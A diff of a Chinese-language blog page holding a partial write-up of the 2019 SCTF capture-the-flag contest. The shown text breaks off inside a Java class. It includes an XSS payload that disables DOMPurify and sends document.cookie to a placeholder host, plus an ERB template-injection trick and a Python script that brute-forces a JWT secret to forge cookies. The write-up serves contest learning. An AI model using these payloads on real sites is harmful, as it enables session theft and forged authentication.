@@ -6,14 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://www.codemonster.cn">
-  <title>Archives: 2017/7 | 打代码的怪兽 CodeMonster</title>
+  <title>2019 SCTF 部分 WriteUp | 打代码的怪兽 CodeMonster</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="打代码的怪兽 CodeMonster">
-<meta property="og:url" content="https://www.codemonster.cn/archives/2017/07/index.html">
+  <meta name="description" content="刚刚毕业，正好周末遇上SCTF，打了两天，这里记录一下做的几道题">
+<meta name="keywords" content="WriteUp,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 SCTF 部分 WriteUp">
+<meta property="og:url" content="https://www.codemonster.cn/2019/06/24/2019-sctf-writeup/index.html">
 <meta property="og:site_name" content="打代码的怪兽 CodeMonster">
+<meta property="og:description" content="刚刚毕业，正好周末遇上SCTF，打了两天，这里记录一下做的几道题">
+<meta property="og:image" content="https://www.codemonster.cn/img/2019-sctf-1.png">
+<meta property="og:image" content="https://www.codemonster.cn/img/2019-sctf-2.png">
+<meta property="og:image" content="https://www.codemonster.cn/img/2019-sctf-3.png">
+<meta property="og:image" content="https://www.codemonster.cn/img/2019-sctf-4.png">
+<meta property="og:image" content="https://www.codemonster.cn/img/2019-sctf-5.png">
+<meta property="og:image" content="https://www.codemonster.cn/img/2019-sctf-6.png">
+<meta property="og:image" content="https://www.codemonster.cn/img/2019-sctf-7.png">
+<meta property="og:updated_time" content="2019-06-24T09:29:03.369Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="打代码的怪兽 CodeMonster">
+<meta name="twitter:title" content="2019 SCTF 部分 WriteUp">
+<meta name="twitter:description" content="刚刚毕业，正好周末遇上SCTF，打了两天，这里记录一下做的几道题">
+<meta name="twitter:image" content="https://www.codemonster.cn/img/2019-sctf-1.png">
   
     <link rel="alternative" href="/atom.xml" title="打代码的怪兽 CodeMonster" type="application/atom+xml">
   
@@ -145,106 +158,134 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-2019-sctf-writeup" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/07/28/2017-hackburger-some-writeup/" class="archive-article-date">
-  	<time datetime="2017-07-28T08:13:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-28</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/07/28/2017-hackburger-some-writeup/">2017 hackburger.ee 部分题 WriteUp</a>
+    <h1 class="article-title" itemprop="name">
+      2019 SCTF 部分 WriteUp
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2019/06/24/2019-sctf-writeup/" class="archive-article-date">
+  	<time datetime="2019-06-24T06:42:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-06-24</time>
+</a>
+        
+		
+		
+		<span id="busuanzi_container_page_pv" class="archive-article-data">
+		  阅读量:<span id="busuanzi_value_page_pv"></span>
+		</span>
+		
+      </header>
+    
+	
+		<p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+	<span class="btn-bg"></span>
+	<span class="btn-text">文章导航</span>
+</p>
+<div id="toc-article" class="toc-article">
+	<span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+	<strong class="toc-title">文章目录</strong>
+	<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#math-is-fun1"><span class="toc-number">1.</span> <span class="toc-text">math-is-fun1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#math-is-fun2"><span class="toc-number">2.</span> <span class="toc-text">math-is-fun2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-shop"><span class="toc-number">3.</span> <span class="toc-text">flag shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Maaaaaaze"><span class="toc-number">4.</span> <span class="toc-text">Maaaaaaze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#music"><span class="toc-number">5.</span> <span class="toc-text">music</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol>
+</div>
+<script type="text/javascript">
+	function showToc(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:block");
+		show_toc_btn.setAttribute("style","display:none");
+		};
+	function showBtn(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:none");
+		show_toc_btn.setAttribute("style","display:block");
+	};
+</script>
+    		
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>刚刚毕业，正好周末遇上SCTF，打了两天，这里记录一下做的几道题<br><a id="more"></a></p>
+<h2 id="math-is-fun1"><a href="#math-is-fun1" class="headerlink" title="math-is-fun1"></a>math-is-fun1</h2><p>题目给了个在线编辑器<br><a href="http://47.110.128.101/challenge?name=Challenger" target="_blank" rel="noopener">http://47.110.128.101/challenge?name=Challenger</a><br>可以提交一个url到服务器，结合hint确定是要xss了<br><a href="http://47.110.128.101/send_message.html" target="_blank" rel="noopener">http://47.110.128.101/send_message.html</a></p>
+<p>启用了Dompurify，且配置文件<a href="http://47.110.128.101/config" target="_blank" rel="noopener">http://47.110.128.101/config</a> 如下<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(&#123;"SAFE_FOR_JQUERY":true,"ALLOWED_TAGS":["style","img","video"],"ALLOWE</div><div class="line">D_ATTR":["style","src","href"],"FORBID_TAGS":["base","svg","link","iframe","frame","embed"]&#125;)</div></pre></td></tr></table></figure></p>
+<p>分析了页面里的js代码<br>渲染流程如下：</p>
+<ul>
+<li>服务器将name参数拼接到一个config类型的script标签中</li>
+<li>读取上面那个标签的内容并解析然后给window[]赋值 （这里可以变量覆盖）</li>
+<li>将config[name]拼接到textarea中</li>
+<li>读取location.search中的text，URLdecode后覆盖textarea</li>
+<li>监听textarea变化后会执行如下事件<ul>
+<li>读取textarea的内容</li>
+<li>Dompurify过滤 （上面发的先知链接已经被修复）</li>
+<li>markdown渲染 （不知道用的啥库）</li>
+<li>latex渲染 （用的mathjax2.7.5不存在已知xss）</li>
+<li>插入页面</li>
+</ul>
+</li>
+</ul>
+<p>猜测是要覆盖DOMPurify的某些变量，能够使其失效，翻看Dompurify的源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/cure53/DOMPurify/blob/c57dd450d8613fddfda67ad182526f371b4638fd/src/purify.js :966</div></pre></td></tr></table></figure></p>
+<p><img src="/img/2019-sctf-1.png" alt=""><br>当<code>DOMPurify.isSupported</code>为<code>false</code>，则能够绕过过滤<br>于是构造<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span></span></div></pre></td></tr></table></figure></p>
+<p>把<code>DOMPurify.isSupported</code>设置为false，text参数的值就能直接插入页面中，造成xss<br>（这里不知道为啥<code>text=&lt;script&gt;alert(1)</code>直接就绕过csp弹窗了，可能是非预期<br><img src="/img/2019-sctf-2.png" alt=""></p>
+<p>最后payload：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href%<span class="number">3</span>d<span class="string">"http://xxxx.xxxx/?a%3d"</span>%<span class="number">2</span>bescape(<span class="built_in">document</span>.cookie)</span></span></div></pre></td></tr></table></figure></p>
+<p>两题都可以用这个paylaod打<br><img src="/img/2019-sctf-3.png" alt=""></p>
+<h2 id="math-is-fun2"><a href="#math-is-fun2" class="headerlink" title="math-is-fun2"></a>math-is-fun2</h2><p>题解同上，<br>payload：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">name=a;alert(<span class="number">1</span>);%<span class="number">0</span>aDOMPurify[%<span class="number">27</span>isSupported%<span class="number">27</span>]%<span class="number">3</span>dfalse&amp;text=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href%<span class="number">3</span>d<span class="string">"http://xxxx.xxxx/?a%3d"</span>%<span class="number">2</span>bescape(<span class="built_in">document</span>.cookie)</span></span></div></pre></td></tr></table></figure></p>
+<h2 id="flag-shop"><a href="#flag-shop" class="headerlink" title="flag shop"></a>flag shop</h2><p>robots.txt提示/filebak，访问后拿到源码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'sinatra/cookies'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'jwt'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'erb'</span></div><div class="line"></div><div class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/static'</span></div><div class="line"></div><div class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></div><div class="line"><span class="comment">#ENV["SECRET"] = SecureRandom.hex(xx)</span></div><div class="line"></div><div class="line">configure <span class="keyword">do</span></div><div class="line"> enable <span class="symbol">:logging</span></div><div class="line"> file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</div><div class="line"> file.sync = <span class="literal">true</span></div><div class="line"> use Rack::CommonLogger, file</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/"</span> <span class="keyword">do</span></div><div class="line"> redirect <span class="string">'/shop'</span>, <span class="number">302</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/filebak"</span> <span class="keyword">do</span></div><div class="line"> content_type <span class="symbol">:text</span></div><div class="line"> erb IO.binread __FILE_<span class="number">_</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/api/auth"</span> <span class="keyword">do</span></div><div class="line"> payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</div><div class="line"> auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></div><div class="line"> cookies[<span class="symbol">:auth</span>] = auth</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/api/info"</span> <span class="keyword">do</span></div><div class="line"> islogin</div><div class="line"> auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</div><div class="line"> json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">"uid"</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>]&#125;)</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/shop"</span> <span class="keyword">do</span></div><div class="line"> erb <span class="symbol">:shop</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></div><div class="line"> islogin</div><div class="line"> auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</div><div class="line"> auth = auth[<span class="number">0</span>]</div><div class="line"> <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</div><div class="line">   <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</div><div class="line">     puts ENV[<span class="string">"FLAG"</span>]</div><div class="line">   <span class="keyword">end</span></div><div class="line"> <span class="keyword">end</span></div><div class="line"></div><div class="line"> <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></div><div class="line"></div><div class="line">   auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</div><div class="line">   auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></div><div class="line">   cookies[<span class="symbol">:auth</span>] = auth</div><div class="line">   ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</div><div class="line"></div><div class="line"> <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">post <span class="string">"/shop"</span> <span class="keyword">do</span></div><div class="line"> islogin</div><div class="line"> auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</div><div class="line"></div><div class="line"> <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>] &lt; FLAGPRICE <span class="keyword">then</span></div><div class="line"></div><div class="line">   json(&#123;<span class="symbol">title:</span> <span class="string">"error"</span>,<span class="symbol">message:</span> <span class="string">"no enough jkl"</span>&#125;)</div><div class="line"> <span class="keyword">else</span></div><div class="line"></div><div class="line">   auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">"FLAG"</span>]&#125;</div><div class="line">   auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></div><div class="line">   cookies[<span class="symbol">:auth</span>] = auth</div><div class="line">   json(&#123;<span class="symbol">title:</span> <span class="string">"success"</span>,<span class="symbol">message:</span> <span class="string">"jkl is good thing"</span>&#125;)</div><div class="line"> <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></div><div class="line"> <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></div><div class="line">   redirect to(<span class="string">'/shop'</span>)</div><div class="line"> <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
+<p>发现<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</div></pre></td></tr></table></figure></p>
+<p>存在erb模版注入，构造name为 <code>&lt;%=$~%&gt;</code>，do为<code>&lt;%=$~%&gt; is working</code>，结合<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)，</div></pre></td></tr></table></figure></p>
+<p>其中的<code>SECRET</code>参数可控，如果匹配到SECRET，则<code>$~</code>(ruby特性，表示最近一次正则匹配结果) 会在页面中返回，于是可以爆破secret，然后伪造JWT去买flag。<br>爆破脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line">url = <span class="string">"http://47.110.15.101"</span></div><div class="line">re = requests.session()</div><div class="line">re.get(url + <span class="string">"/api/auth"</span>)</div><div class="line"></div><div class="line">flag = <span class="string">"09810e652ce9fa4882fe4875c"</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">   i = <span class="string">""</span></div><div class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</div><div class="line">       <span class="comment">#now = flag + i</span></div><div class="line">       now = i + flag</div><div class="line">       res = re.get(url + <span class="string">"/work?name=%3c%25%3d%24%7e%25%3e&amp;do=%3c%25%3d%24%7e%25%3e%20is%20working&amp;SECRET="</span>+now)</div><div class="line">       <span class="keyword">if</span> len(res.text) &gt; <span class="number">48</span>:</div><div class="line">           <span class="keyword">print</span> res.text</div><div class="line">           <span class="keyword">print</span> flag</div><div class="line">           flag = now</div><div class="line">           <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure></p>
+<p><img src="/img/2019-sctf-4.png" alt=""><br>拿到SECRET后就是伪造cookie去买flag了<br><img src="/img/2019-sctf-5.png" alt=""><br><img src="/img/2019-sctf-6.png" alt=""></p>
+<h2 id="Maaaaaaze"><a href="#Maaaaaaze" class="headerlink" title="Maaaaaaze"></a>Maaaaaaze</h2><p>题目意思是找100*100的迷宫中任意两点最大路径<br>于是把html处理一下，然后任意取一个点作为起点，扔到dfs里跑最长路径，等跑不动的时候拿当前最长路径的重点作为起点再扔进dfs去跑，最后就得到答案<code>4056</code>了<br>脚本如下（好久没写算法了还真有点手生）：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line">sys.setrecursionlimit(<span class="number">100000</span>)</div><div class="line"></div><div class="line">file = open(<span class="string">"sctfmaze.txt"</span>)</div><div class="line">maze = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)]</div><div class="line">vis = [[<span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>)]</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span></div><div class="line">   t = <span class="number">0</span></div><div class="line">   r = <span class="number">0</span></div><div class="line">   b = <span class="number">0</span></div><div class="line">   l = <span class="number">0</span></div><div class="line"><span class="comment">#print maze</span></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file:</div><div class="line">   a = line[:<span class="number">-1</span>].split(<span class="string">" "</span>)</div><div class="line">   <span class="comment">#print a</span></div><div class="line">   n = Node()</div><div class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,len(a)):</div><div class="line">       <span class="comment">#print a[i],</span></div><div class="line">       <span class="keyword">if</span> a[i] == <span class="string">'0'</span> :</div><div class="line">           n.t = <span class="number">1</span></div><div class="line">       <span class="keyword">if</span> a[i] == <span class="string">'1'</span> :</div><div class="line">           n.r = <span class="number">1</span></div><div class="line">       <span class="keyword">if</span> a[i] == <span class="string">'2'</span> :</div><div class="line">           n.b = <span class="number">1</span></div><div class="line">       <span class="keyword">if</span> a[i] == <span class="string">'3'</span> :</div><div class="line">           n.l = <span class="number">1</span></div><div class="line">       <span class="comment">#print a[i],</span></div><div class="line">   <span class="comment">#print</span></div><div class="line">   maze[int(a[<span class="number">0</span>])][int(a[<span class="number">1</span>])] = n</div><div class="line">   <span class="comment">#print a[0],a[1],maze[int(a[0])][int(a[1])].b</span></div><div class="line"><span class="comment">#exit()</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(i,j)</span>:</span></div><div class="line">   <span class="keyword">if</span> i&gt;=<span class="number">100</span> <span class="keyword">or</span> i&lt;<span class="number">0</span> <span class="keyword">or</span> j&gt;=<span class="number">100</span> <span class="keyword">or</span> j&lt;<span class="number">0</span>:</div><div class="line">       <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">   <span class="keyword">if</span> vis[i][j] == <span class="number">1</span>:</div><div class="line">       <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">   <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">printmap</span><span class="params">()</span>:</span></div><div class="line">   <span class="keyword">global</span> vis</div><div class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</div><div class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</div><div class="line">           <span class="keyword">if</span> vis[i][j] == <span class="number">1</span>:</div><div class="line">               <span class="keyword">print</span> <span class="string">"%2d%2d"</span> % (i,j)</div><div class="line">           <span class="keyword">print</span> <span class="string">"    "</span></div><div class="line"></div><div class="line">maxx = <span class="number">0</span></div><div class="line"><span class="keyword">print</span> maxx,i,j</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i,j,n)</span>:</span></div><div class="line">   <span class="keyword">global</span> maxx</div><div class="line">   <span class="keyword">global</span> vis</div><div class="line">   <span class="keyword">global</span> maze</div><div class="line">   n += <span class="number">1</span></div><div class="line">  </div><div class="line">   <span class="comment">#print maxx,i,j,n,maze[i][j].t,maze[i][j].r,maze[i][j].b,maze[i][j].l</span></div><div class="line">   <span class="keyword">if</span> n&gt;maxx:</div><div class="line">       <span class="keyword">print</span> n,i,j</div><div class="line">       <span class="comment">#print n,i,j,maze[i][j].t,maze[i][j].r,maze[i][j].b,maze[i][j].l</span></div><div class="line">  </div><div class="line">       maxx = n</div><div class="line">   <span class="keyword">if</span> check(i<span class="number">-1</span>,j) <span class="keyword">and</span> maze[i][j].t == <span class="number">0</span>:</div><div class="line">       vis[i<span class="number">-1</span>][j] = <span class="number">1</span></div><div class="line">       dfs(i<span class="number">-1</span>,j,n)</div><div class="line">       vis[i<span class="number">-1</span>][j] = <span class="number">0</span></div><div class="line">   <span class="keyword">if</span> check(i,j+<span class="number">1</span>) <span class="keyword">and</span> maze[i][j].r == <span class="number">0</span>:</div><div class="line">       vis[i][j+<span class="number">1</span>] = <span class="number">1</span></div><div class="line">       dfs(i,j+<span class="number">1</span>,n)</div><div class="line">       vis[i][j+<span class="number">1</span>] = <span class="number">0</span></div><div class="line">   <span class="keyword">if</span> check(i+<span class="number">1</span>,j) <span class="keyword">and</span> maze[i][j].b == <span class="number">0</span>:</div><div class="line">       vis[i+<span class="number">1</span>][j] = <span class="number">1</span></div><div class="line">       dfs(i+<span class="number">1</span>,j,n)</div><div class="line">       vis[i+<span class="number">1</span>][j] = <span class="number">0</span></div><div class="line">   <span class="keyword">if</span> check(i,j<span class="number">-1</span>) <span class="keyword">and</span> maze[i][j].l == <span class="number">0</span>:</div><div class="line">       vis[i][j<span class="number">-1</span>] = <span class="number">1</span></div><div class="line">       dfs(i,j<span class="number">-1</span>,n)</div><div class="line">       vis[i][j<span class="number">-1</span>] = <span class="number">0</span></div><div class="line"></div><div class="line">vis[<span class="number">70</span>][<span class="number">22</span>] = <span class="number">1</span></div><div class="line">dfs(<span class="number">70</span>,<span class="number">22</span>,<span class="number">0</span>)</div><div class="line">exit()</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</div><div class="line">   <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</div><div class="line">       <span class="comment">#print i,j</span></div><div class="line">       vis[i][j] = <span class="number">1</span></div><div class="line">       dfs(i,j,<span class="number">0</span>)</div><div class="line">       vis[i][j] = <span class="number">0</span></div></pre></td></tr></table></figure></p>
+<h2 id="music"><a href="#music" class="headerlink" title="music"></a>music</h2><p>这是道逆向题，前面是队友做的，到我这给了我一个java的加密类和密文与密钥，要求解出明文<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span 